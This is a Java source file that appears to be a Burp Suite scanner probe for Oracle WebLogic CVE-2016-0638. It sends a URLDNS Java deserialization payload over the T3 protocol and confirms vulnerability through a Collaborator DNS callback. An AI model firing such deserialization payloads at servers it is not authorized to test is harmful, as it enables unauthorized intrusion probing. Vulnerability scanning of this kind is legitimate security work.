package probes;

import burp.*;
import payloads.URLDNS;

import java.net.Socket;

public class CVE_2016_0638 extends Probe {
    private static final String NAME = "CVE-2016-0638";
    private static final String SEVERITY = "High";
    private static final String DESC = "Unspecified vulnerability in the Oracle WebLogic Server component in Oracle Fusion Middleware 10.3.6, 12.1.2, 12.1.3, and 12.2.1 allows remote attackers to affect confidentiality, integrity, and availability via vectors related to Java Messaging Service.";

    @Override
    public IScanIssue check(IHttpRequestResponse requestResponse) {
        IHttpService service = requestResponse.getHttpService();
        String pollPayload = Utilities.collaborator.generatePayload(true);
        try {
            Socket s = new Socket(service.getHost(), service.getPort());
            s.setSoTimeout(10);
            byte[] payload = URLDNS.getPayloadBytes("http://" + pollPayload, "streamMessageImpl");
            sendT3Payload(s, payload);
            s.close();
        } catch (Exception e) {
            e.printStackTrace(Utilities.err);
        }

        String detail = Utilities.fetchInteraction(pollPayload);

        if (detail.length() > 0) {
            return new WebLogicIssue(
                    requestResponse,
                    NAME,
                    DESC + "<br/><br/>" + detail,
                    SEVERITY);
        } else return null;
    }
}
